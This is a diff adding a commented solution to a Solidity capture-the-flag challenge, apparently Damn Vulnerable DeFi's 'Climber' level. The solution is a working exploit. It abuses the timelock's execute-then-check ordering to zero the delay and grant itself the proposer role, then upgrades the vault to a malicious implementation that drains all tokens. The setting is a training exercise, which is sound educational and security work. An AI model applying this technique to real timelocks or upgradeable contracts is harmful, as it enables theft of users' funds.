@@ -85,33 +85,55 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
+        // Steps to pass this challenge:
+        // 1) Deploy VulnerableUpgrade implementation contract and Scheduler helper contract
+        // 2) Build and encode arrays needed for timelock.execute() call
+        // 3) Save exact copies of the arrays in the Scheduler contract to be used in timelock.schedule() call
+        // 4) Initiate attack through timelock.execute(), with the encoded calls needed to solve the challenge
+        //      (operations encoded within execute call so the timelock contract is seen as msg.sender)
+        //      4a) Update delay in timelock to 0 because timelock.getOperationState considers an operation ReadyForExecution when block.timestamp >= readyAtTimestamp, setting delay to 0 allows scheduling and execution within the same transaction.
+        //      4b) Grant proposer role to the Scheduler contract we deployed so we have the necessary permissions to call timelock.schedule
+        //      4c) Call timelock.schedule() through scheduler.schedule() with the same exact inputs we called timelock.execute() with so we can add the operation and make it eligible for execution before the execution call reaches getOperationState() check
+        //      4d) Upgrade the vaults implementation address to the VulnerableUpgrade contract we deployed and call vulnerableUpgrade.drain via upgradeToAndCall using the timelock’s owner privileges after bypassing the timelock’s scheduling and delayed execution process
+
+        // deploy extra contracts needed for challenge
         VulnerableUpgrade vulnerableUpgrade = new VulnerableUpgrade();
         Scheduler scheduler = new Scheduler(timelock);
 
-        bytes32 salt;
+        // set state needed for arrays and execute call
+        bytes32 salt = 0;
         uint64 newDelay = 0;
         uint256 amount = token.balanceOf(address(vault));
         bytes memory encodedCall = abi.encodeCall(vulnerableUpgrade.drain, (address(token), recovery, amount));
 
+        // build targets array
         address[] memory targets = new address[](4);
         targets[0] = address(timelock);
         targets[1] = address(timelock);
         targets[2] = address(scheduler);
         targets[3] = address(vault);
 
+        // build values array (all 0 since no ETH value is sent)
         uint256[] memory values = new uint256[](4);
         values[0] = 0;
         values[1] = 0;
         values[2] = 0;
         values[3] = 0;
 
+        // build dataElements array
         bytes[] memory dataElements = new bytes[](4);
+        // update delay so we can execute and schedule simultaneously
         dataElements[0] = abi.encodeCall(timelock.updateDelay, (newDelay));
+        // grant our scheduler contract the proposer role
         dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(scheduler)));
+        // schedule the execute operation through our scheduler contract that now has the proposer role
         dataElements[2] = abi.encodeCall(scheduler.schedule, ());
+        // upgrade the vault contract to a new malicious implementation that allows us to withdraw all DVT and call it with encoded data to rescue funds
         dataElements[3] = abi.encodeCall(vault.upgradeToAndCall, (address(vulnerableUpgrade), encodedCall));
 
+        // save arrays built above into our scheduler contract to avoid self-referential calldata issue caused by trying to directly call schedule within an execute call
         scheduler.setUp(targets, values, dataElements, salt);
+        // execute operations
         timelock.execute(targets, values, dataElements, salt);
     }
 
@@ -128,18 +150,27 @@ contract ClimberChallenge is Test {
                             SOLUTION
 //////////////////////////////////////////////////////////////*/
 
+// imports needed for helper contracts
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
+// vulnerable implementation contract to replace ClimberVault.sol so we can withdraw all DVT from the vault
+// need to inherit UUPSUpgradeable to satisfy ERC1967InvalidImplementation error
 contract VulnerableUpgrade is UUPSUpgradeable {
-    function drain(address token, address receiver, uint256 amount) public {
+    // intentionally lacking access controls for exploit payload
+    function drain(address token, address receiver, uint256 amount) external {
+        // send tokens to arbitrary address, bypassing all checks and access controls
         IERC20(token).transfer(receiver, amount);
     }
 
+    // required by UUPSUpgradeable
     function _authorizeUpgrade(address newImplementation) internal override {}
 }
 
+// helper contract to handle timelock.schedule() call so we can avoid self-referential data errors when building dataElements array
 contract Scheduler {
+    error ContractIsAlreadySetUp();
+
     ClimberTimelock timelock;
     address[] targets;
     uint256[] values;
@@ -150,16 +181,24 @@ contract Scheduler {
         timelock = timelock_;
     }
 
+    // setup helper contract
     function setUp(address[] memory targets_, uint256[] memory values_, bytes[] memory dataElements_, bytes32 salt_)
-        public
+        external
     {
+        // ensure contract is setUp only once
+        if (targets.length != 0) {
+            revert ContractIsAlreadySetUp();
+        }
+        // save arrays and salt needed for timelock.schedule() call within our timelock.execute() call
         targets = targets_;
         values = values_;
         dataElements = dataElements_;
         salt = salt_;
     }
 
-    function schedule() public {
+    // schedule the operation that is already ongoing, after this contract is granted the proposer role earlier in the same transaction
+    function schedule() external {
+        // schedule operation from timelock contract while it is being executed to avoid timelock.NotReadyForExecution() error
         timelock.schedule(targets, values, dataElements, salt);
     }
 }
